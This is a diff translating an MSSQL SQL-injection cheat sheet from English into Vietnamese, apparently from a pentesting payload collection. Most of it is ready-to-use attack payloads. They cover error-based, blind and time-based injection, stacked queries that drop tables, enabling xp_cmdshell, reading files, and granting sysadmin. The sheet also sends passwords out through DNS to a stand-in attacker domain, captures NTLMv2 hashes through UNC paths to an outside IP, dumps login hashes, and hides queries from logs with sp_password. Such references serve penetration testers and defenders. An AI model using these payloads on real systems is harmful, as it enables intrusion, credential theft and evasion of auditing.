@@ -1,76 +1,76 @@
 # MSSQL Injection
 
-> MSSQL Injection  is a type of security vulnerability that can occur when an attacker can insert or "inject" malicious SQL code into a query executed by a Microsoft SQL Server (MSSQL) database. This typically happens when user inputs are directly included in SQL queries without proper sanitization or parameterization. SQL Injection can lead to serious consequences such as unauthorized data access, data manipulation, and even gaining control over the database server.
+> MSSQL Injection là một loại lỗ hổng bảo mật có thể xảy ra khi kẻ tấn công có thể chèn ("inject") mã SQL độc hại vào một câu truy vấn được thực thi bởi cơ sở dữ liệu Microsoft SQL Server (MSSQL). Điều này thường xảy ra khi dữ liệu đầu vào của người dùng được đưa trực tiếp vào câu truy vấn SQL mà không được kiểm tra, làm sạch hoặc tham số hóa đúng cách. SQL Injection có thể dẫn đến những hậu quả nghiêm trọng như truy cập dữ liệu trái phép, thao túng dữ liệu, và thậm chí là chiếm quyền kiểm soát máy chủ cơ sở dữ liệu.
 
-## Summary
+## Tóm tắt
 
-* [MSSQL Default Databases](#mssql-default-databases)
-* [MSSQL Comments](#mssql-comments)
-* [MSSQL Enumeration](#mssql-enumeration)
-    * [MSSQL List Databases](#mssql-list-databases)
-    * [MSSQL List Tables](#mssql-list-tables)
-    * [MSSQL List Columns](#mssql-list-columns)
-* [MSSQL Union Based](#mssql-union-based)
-* [MSSQL Error Based](#mssql-error-based)
-* [MSSQL Blind Based](#mssql-blind-based)
-    * [MSSQL Blind With Substring Equivalent](#mssql-blind-with-substring-equivalent)
-* [MSSQL Time Based](#mssql-time-based)
-* [MSSQL Stacked Query](#mssql-stacked-query)
-* [MSSQL File Manipulation](#mssql-file-manipulation)
-    * [MSSQL Read File](#mssql-read-file)
-    * [MSSQL Write File](#mssql-write-file)
-* [MSSQL Command Execution](#mssql-command-execution)
+* [Các cơ sở dữ liệu mặc định của MSSQL](#mssql-default-databases)
+* [Chú thích trong MSSQL](#mssql-comments)
+* [Liệt kê thông tin MSSQL](#mssql-enumeration)
+    * [Liệt kê cơ sở dữ liệu MSSQL](#mssql-list-databases)
+    * [Liệt kê bảng MSSQL](#mssql-list-tables)
+    * [Liệt kê cột MSSQL](#mssql-list-columns)
+* [Khai thác dựa trên Union](#mssql-union-based)
+* [Khai thác dựa trên lỗi](#mssql-error-based)
+* [Khai thác dạng mù (Blind)](#mssql-blind-based)
+    * [Khai thác mù tương đương với Substring](#mssql-blind-with-substring-equivalent)
+* [Khai thác dựa trên thời gian](#mssql-time-based)
+* [Truy vấn xếp chồng (Stacked Query)](#mssql-stacked-query)
+* [Thao tác tập tin MSSQL](#mssql-file-manipulation)
+    * [Đọc tập tin MSSQL](#mssql-read-file)
+    * [Ghi tập tin MSSQL](#mssql-write-file)
+* [Thực thi lệnh trên MSSQL](#mssql-command-execution)
     * [XP_CMDSHELL](#xp_cmdshell)
-    * [Python Script](#python-script)
+    * [Script Python](#python-script)
 * [MSSQL Out of Band](#mssql-out-of-band)
-    * [MSSQL DNS Exfiltration](#mssql-dns-exfiltration)
-    * [MSSQL UNC Path](#mssql-unc-path)
-* [MSSQL Trusted Links](#mssql-trusted-links)
-* [MSSQL Privileges](#mssql-privileges)
-    * [MSSQL List Permissions](#mssql-list-permissions)
-    * [MSSQL Make User DBA](#mssql-make-user-dba)
-* [MSSQL Database Credentials](#mssql-database-credentials)
-* [MSSQL OPSEC](#mssql-opsec)
-* [References](#references)
+    * [Trích xuất dữ liệu qua DNS trên MSSQL](#mssql-dns-exfiltration)
+    * [Đường dẫn UNC của MSSQL](#mssql-unc-path)
+* [Các liên kết đáng tin cậy (Trusted Links) của MSSQL](#mssql-trusted-links)
+* [Quyền hạn trong MSSQL](#mssql-privileges)
+    * [Liệt kê quyền hạn MSSQL](#mssql-list-permissions)
+    * [Biến người dùng thành DBA trong MSSQL](#mssql-make-user-dba)
+* [Thông tin xác thực cơ sở dữ liệu MSSQL](#mssql-database-credentials)
+* [Bảo mật vận hành (OPSEC) trong MSSQL](#mssql-opsec)
+* [Tài liệu tham khảo](#references)
 
-## MSSQL Default Databases
+## Các cơ sở dữ liệu mặc định của MSSQL
 
-| Name               | Description                          |
-| ------------------ | ------------------------------------ |
-| pubs               | Not available on MSSQL 2005          |
-| model              | Available in all versions            |
-| msdb               | Available in all versions            |
-| tempdb             | Available in all versions            |
-| northwind          | Available in all versions            |
-| information_schema | Available from MSSQL 2000 and higher |
+| Tên                 | Mô tả                                  |
+| ------------------- | --------------------------------------- |
+| pubs                | Không có sẵn trong MSSQL 2005           |
+| model               | Có sẵn trong tất cả các phiên bản       |
+| msdb                | Có sẵn trong tất cả các phiên bản       |
+| tempdb              | Có sẵn trong tất cả các phiên bản       |
+| northwind           | Có sẵn trong tất cả các phiên bản       |
+| information_schema  | Có sẵn từ MSSQL 2000 trở lên            |
 
-## MSSQL Comments
+## Chú thích trong MSSQL
 
-| Type                  | Description     |
-| --------------------- | --------------- |
-| `/* MSSQL Comment */` | C-style comment |
-| `--`                  | SQL comment     |
-| `;%00`                | Null byte       |
+| Loại                    | Mô tả              |
+| ------------------------ | ------------------ |
+| `/* MSSQL Comment */`   | Chú thích kiểu C    |
+| `--`                    | Chú thích dạng SQL  |
+| `;%00`                  | Byte null           |
 
-## MSSQL Enumeration
+## Liệt kê thông tin MSSQL
 
-| Description     | SQL Query                                 |
-| --------------- | ----------------------------------------- |
-| DBMS version    | `SELECT @@version`                        |
-| Database name   | `SELECT DB_NAME()`                        |
-| Database schema | `SELECT SCHEMA_NAME()`                    |
-| Hostname        | `SELECT HOST_NAME()`                      |
-| Hostname        | `SELECT @@hostname`                       |
-| Hostname        | `SELECT @@SERVERNAME`                     |
-| Hostname        | `SELECT SERVERPROPERTY('productversion')` |
-| Hostname        | `SELECT SERVERPROPERTY('productlevel')`   |
-| Hostname        | `SELECT SERVERPROPERTY('edition')`        |
-| User            | `SELECT CURRENT_USER`                     |
-| User            | `SELECT user_name();`                     |
-| User            | `SELECT system_user;`                     |
-| User            | `SELECT user;`                            |
+| Mô tả                    | Câu truy vấn SQL                          |
+| ------------------------- | ------------------------------------------- |
+| Phiên bản DBMS            | `SELECT @@version`                        |
+| Tên cơ sở dữ liệu         | `SELECT DB_NAME()`                        |
+| Schema cơ sở dữ liệu      | `SELECT SCHEMA_NAME()`                    |
+| Tên máy chủ (Hostname)    | `SELECT HOST_NAME()`                      |
+| Tên máy chủ (Hostname)    | `SELECT @@hostname`                       |
+| Tên máy chủ (Hostname)    | `SELECT @@SERVERNAME`                     |
+| Tên máy chủ (Hostname)    | `SELECT SERVERPROPERTY('productversion')` |
+| Tên máy chủ (Hostname)    | `SELECT SERVERPROPERTY('productlevel')`   |
+| Tên máy chủ (Hostname)    | `SELECT SERVERPROPERTY('edition')`        |
+| Người dùng                | `SELECT CURRENT_USER`                     |
+| Người dùng                | `SELECT user_name();`                     |
+| Người dùng                | `SELECT system_user;`                     |
+| Người dùng                | `SELECT user;`                            |
 
-### MSSQL List Databases
+### Liệt kê cơ sở dữ liệu MSSQL
 
 ```sql
 SELECT name FROM master..sysdatabases;
@@ -84,7 +84,7 @@ SELECT DB_NAME(N);
 SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; 
 ```
 
-### MSSQL List Tables
+### Liệt kê bảng MSSQL
 
 ```sql
 -- use xtype = 'V' for views
@@ -102,7 +102,7 @@ SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'
 SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
 ```
 
-### MSSQL List Columns
+### Liệt kê cột MSSQL
 
 ```sql
 -- for the current DB only
@@ -116,9 +116,9 @@ SELECT table_catalog, column_name FROM information_schema.columns
 SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
 ```
 
-## MSSQL Union Based
+## Khai thác dựa trên Union
 
-* Extract databases names
+* Trích xuất tên các cơ sở dữ liệu
 
     ```sql
     $ SELECT name FROM master..sysdatabases
@@ -127,7 +127,7 @@ SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
     [*] tempdb
     ```
 
-* Extract tables from Injection database
+* Trích xuất các bảng từ cơ sở dữ liệu Injection
 
     ```sql
     $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
@@ -136,7 +136,7 @@ SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
     [*] Users
     ```
 
-* Extract columns for the table Users
+* Trích xuất các cột của bảng Users
 
     ```sql
     $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
@@ -144,36 +144,36 @@ SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
     [*] UserName
     ```
 
-* Finally extract the data
+* Cuối cùng trích xuất dữ liệu
 
     ```sql
     SELECT  UserId, UserName from Users
     ```
 
-## MSSQL Error Based
+## Khai thác dựa trên lỗi
 
-| Name    | Payload                                                          |
-| ------- | ---------------------------------------------------------------- |
-| CONVERT | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |
-| IN      | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -`         |
-| EQUAL   | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -`               |
-| CAST    | `CAST((SELECT @@version) AS INT)`                                |
+| Tên      | Payload                                                          |
+| -------- | ---------------------------------------------------------------- |
+| CONVERT  | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |
+| IN       | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -`         |
+| EQUAL    | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -`               |
+| CAST     | `CAST((SELECT @@version) AS INT)`                                |
 
-* For integer inputs
+* Đối với dữ liệu đầu vào dạng số nguyên
 
     ```sql
     convert(int,@@version)
     cast((SELECT @@version) as int)
     ```
 
-* For string inputs
+* Đối với dữ liệu đầu vào dạng chuỗi
 
     ```sql
     ' + convert(int,@@version) + '
     ' + cast((SELECT @@version) as int) + '
     ```
 
-## MSSQL Blind Based
+## Khai thác dạng mù (Blind)
 
 ```sql
 AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
@@ -185,13 +185,13 @@ WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_ta
 SELECT message FROM data WHERE row = 1 and message like 't%'
 ```
 
-### MSSQL Blind With Substring Equivalent
+### Khai thác mù tương đương với Substring
 
-| Function    | Example                                  |
-| ----------- | ---------------------------------------- |
+| Hàm         | Ví dụ                                    |
+| ----------- | ----------------------------------------- |
 | `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)` |
 
-Examples:
+Ví dụ:
 
 ```sql
 AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
@@ -200,9 +200,9 @@ AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
 ```
 
-## MSSQL Time Based
+## Khai thác dựa trên thời gian
 
-In a time-based blind SQL injection attack, an attacker injects a payload that uses `WAITFOR DELAY` to make the database pause for a certain period. The attacker then observes the response time to infer whether the injected payload executed successfully or not.
+Trong một cuộc tấn công SQL injection mù dựa trên thời gian, kẻ tấn công chèn một payload sử dụng `WAITFOR DELAY` để khiến cơ sở dữ liệu tạm dừng trong một khoảng thời gian nhất định. Sau đó, kẻ tấn công quan sát thời gian phản hồi để suy luận xem payload được chèn vào có thực thi thành công hay không.
 
 ```sql
 ProductID=1;waitfor delay '0:0:10'--
@@ -217,9 +217,9 @@ IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
 IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
 ```
 
-## MSSQL Stacked Query
+## Truy vấn xếp chồng (Stacked Query)
 
-* Stacked query without any statement terminator
+* Truy vấn xếp chồng không cần dấu kết thúc câu lệnh
 
     ```sql
     -- multiple SELECT statements
@@ -233,39 +233,39 @@ IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
     SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
     ```
 
-* Use a semi-colon "`;`" to add another query
+* Dùng dấu chấm phẩy "`;`" để thêm một truy vấn khác
 
     ```sql
     ProductID=1; DROP members--
     ```
 
-## MSSQL File Manipulation
+## Thao tác tập tin MSSQL
 
-### MSSQL Read File
+### Đọc tập tin MSSQL
 
-**Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABASE BULK OPERATIONS` permission.
+**Quyền hạn**: Tùy chọn `BULK` yêu cầu quyền `ADMINISTER BULK OPERATIONS` hoặc `ADMINISTER DATABASE BULK OPERATIONS`.
 
 ```sql
 OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
 ```
 
-Example:
+Ví dụ:
 
 ```sql
 -1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
 ```
 
-### MSSQL Write File
+### Ghi tập tin MSSQL
 
 ```sql
 execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
 ```
 
-## MSSQL Command Execution
+## Thực thi lệnh trên MSSQL
 
 ### XP_CMDSHELL
 
-`xp_cmdshell` is a system stored procedure in Microsoft SQL Server that allows you to run operating system commands directly from within T-SQL (Transact-SQL).
+`xp_cmdshell` là một thủ tục lưu trữ (stored procedure) hệ thống trong Microsoft SQL Server cho phép chạy các lệnh hệ điều hành trực tiếp từ bên trong T-SQL (Transact-SQL).
 
 ```sql
 EXEC xp_cmdshell "net user";
@@ -273,7 +273,7 @@ EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
 EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
 ```
 
-If you need to reactivate `xp_cmdshell`, it is disabled by default in SQL Server 2005.
+Nếu cần kích hoạt lại `xp_cmdshell`, mặc định nó đã bị vô hiệu hóa trong SQL Server 2005.
 
 ```sql
 -- Enable advanced options
@@ -285,9 +285,9 @@ EXEC sp_configure 'xp_cmdshell',1;
 RECONFIGURE;
 ```
 
-### Python Script
+### Script Python
 
-> Executed by a different user than the one using `xp_cmdshell` to execute commands
+> Được thực thi bởi một người dùng khác với người dùng đang sử dụng `xp_cmdshell` để thực thi lệnh
 
 ```powershell
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
@@ -297,26 +297,26 @@ EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open
 
 ## MSSQL Out of Band
 
-### MSSQL DNS exfiltration
+### Trích xuất dữ liệu qua DNS trên MSSQL
 
-Technique from [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578/photo/1)
+Kỹ thuật từ [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578/photo/1)
 
-* **Permission**: Requires `VIEW SERVER STATE` permission on the server.
+* **Quyền hạn**: Yêu cầu quyền `VIEW SERVER STATE` trên máy chủ.
 
     ```powershell
     1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\1.xem',null,null))
     ```
 
-* **Permission**: Requires the `CONTROL SERVER` permission.
+* **Quyền hạn**: Yêu cầu quyền `CONTROL SERVER`.
 
     ```powershell
     1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\',default,default)))
     1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\1.trc',default))
     ```
 
-### MSSQL UNC Path
+### Đường dẫn UNC của MSSQL
 
-MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.
+MSSQL hỗ trợ truy vấn xếp chồng nên ta có thể tạo một biến trỏ đến địa chỉ IP của mình rồi dùng hàm `xp_dirtree` để liệt kê các tập tin trong SMB share và lấy được hash NTLMv2.
 
 ```sql
 1'; use master; exec xp_dirtree '\\10.10.10.10\SHARE';-- 
@@ -336,19 +336,19 @@ RESTORE REWINDONLY FROM DISK = '\\10.10.10.10\file'
 RESTORE VERIFYONLY FROM DISK = '\\10.10.10.10\file'
 ```
 
-## MSSQL Trusted Links
+## Các liên kết đáng tin cậy (Trusted Links) của MSSQL
 
-A trusted link in Microsoft SQL Server is a linked server relationship that allows one SQL Server instance to execute queries and even remote procedures on another server (or external OLE DB source) as if the remote server were part of the local environment. Linked servers expose options that control whether remote procedures and RPC calls are allowed and what security context is used on the remote server.
+Một liên kết đáng tin cậy trong Microsoft SQL Server là một mối quan hệ máy chủ liên kết (linked server) cho phép một thực thể SQL Server thực thi truy vấn và thậm chí các thủ tục từ xa trên một máy chủ khác (hoặc nguồn OLE DB bên ngoài) như thể máy chủ từ xa đó là một phần của môi trường cục bộ. Các máy chủ liên kết cung cấp các tùy chọn kiểm soát việc có cho phép các thủ tục từ xa và lệnh gọi RPC hay không, cùng với bối cảnh bảo mật nào được dùng trên máy chủ từ xa.
 
-> The links between databases work even across forest trusts.
+> Các liên kết giữa các cơ sở dữ liệu hoạt động ngay cả qua các mối quan hệ tin cậy (trust) giữa các rừng (forest).
 
-* Find links using `sysservers`: contains one row for each server that an instance of SQL Server can access as an OLE DB data source.
+* Tìm các liên kết bằng `sysservers`: chứa một hàng cho mỗi máy chủ mà một thực thể SQL Server có thể truy cập như một nguồn dữ liệu OLE DB.
 
     ```sql
     select * from master..sysservers
     ```
 
-* Execute query through the link
+* Thực thi truy vấn thông qua liên kết
 
     ```sql
     select * from openquery("dcorp-sql1", 'select * from master..sysservers')
@@ -358,7 +358,7 @@ A trusted link in Microsoft SQL Server is a linked server relationship that allo
     select version from openquery("link1",'select version from openquery("link2","select @@version as version")')
     ```
 
-* Execute shell commands
+* Thực thi lệnh shell
 
     ```sql
     -- Enable xp_cmdshell and execute "dir" command
@@ -370,44 +370,44 @@ A trusted link in Microsoft SQL Server is a linked server relationship that allo
     EXECUTE('EXECUTE(''sp_addsrvrolemember ''''User'''' , ''''sysadmin'''' '') AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"
     ```
 
-## MSSQL Privileges
+## Quyền hạn trong MSSQL
 
-### MSSQL List Permissions
+### Liệt kê quyền hạn MSSQL
 
-* Listing effective permissions of current user on the server.
+* Liệt kê các quyền hiệu lực của người dùng hiện tại trên máy chủ.
 
     ```sql
     SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
     ```
 
-* Listing effective permissions of current user on the database.
+* Liệt kê các quyền hiệu lực của người dùng hiện tại trên cơ sở dữ liệu.
 
     ```sql
     SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
     ```
 
-* Listing effective permissions of current user on a view.
+* Liệt kê các quyền hiệu lực của người dùng hiện tại trên một view.
 
     ```sql
     SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
     ```
 
-* Check if current user is a member of the specified server role.
+* Kiểm tra xem người dùng hiện tại có phải là thành viên của vai trò máy chủ được chỉ định hay không.
 
     ```sql
     -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
     SELECT is_srvrolemember('sysadmin');
     ```
 
-### MSSQL Make User DBA
+### Biến người dùng thành DBA trong MSSQL
 
 ```sql
 EXEC master.dbo.sp_addsrvrolemember 'User', 'sysadmin';
 ```
 
-## MSSQL Database Credentials
+## Thông tin xác thực cơ sở dữ liệu MSSQL
 
-* **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`
+* **MSSQL 2000**: Chế độ Hashcat 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`
 
     ```sql
     SELECT name, password FROM master..sysxlogins
@@ -415,23 +415,23 @@ EXEC master.dbo.sp_addsrvrolemember 'User', 'sysadmin';
     -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
     ```
 
-* **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`
+* **MSSQL 2005**: Chế độ Hashcat 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`
 
     ```sql
     SELECT name, password_hash FROM master.sys.sql_logins
     SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
     ```
 
-## MSSQL OPSEC
+## Bảo mật vận hành (OPSEC) trong MSSQL
 
-Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password`
+Dùng `SP_PASSWORD` trong truy vấn để ẩn khỏi nhật ký (log) như sau: `' AND 1=1--sp_password`
 
 ```sql
 -- 'sp_password' was found in the text of this event.
 -- The text has been replaced with this comment for security reasons.
 ```
 
-## References
+## Tài liệu tham khảo
 
 * [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - June 21, 2023](https://web.archive.org/web/20240219205617/https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
 * [Error based SQL Injection in "Order By" clause - Manish Kishan Tanwar - March 26, 2018](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
